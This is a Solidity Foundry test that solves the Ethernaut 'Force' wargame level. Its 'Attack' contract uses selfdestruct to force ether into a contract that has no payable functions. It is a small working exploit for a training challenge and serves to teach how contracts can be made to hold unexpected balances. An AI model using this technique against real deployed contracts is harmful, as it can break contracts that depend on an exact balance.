// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import {Test, console2} from "forge-std/Test.sol";

import {Force} from "ethernaut/levels/Force.sol";

//  Deprecation of selfdestruct (after 0.8.18)
//  https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html#deactivate-and-self-destruct
contract ForceTest is Test {
    Force public victim;
    Attack public attacker;

    function setUp() public {
        victim = new Force();

        attacker = new Attack{value: 1 ether}();
    }

    function testAttack() external {
        assertTrue(address(victim).balance == 0);

        attacker.attack{value: 1 ether}(payable(address(victim)));

        assertTrue(address(victim).balance > 0);
    }
}

contract Attack {
    constructor() payable {}

    function attack(address payable addr) external payable {
        selfdestruct(addr);
    }
}
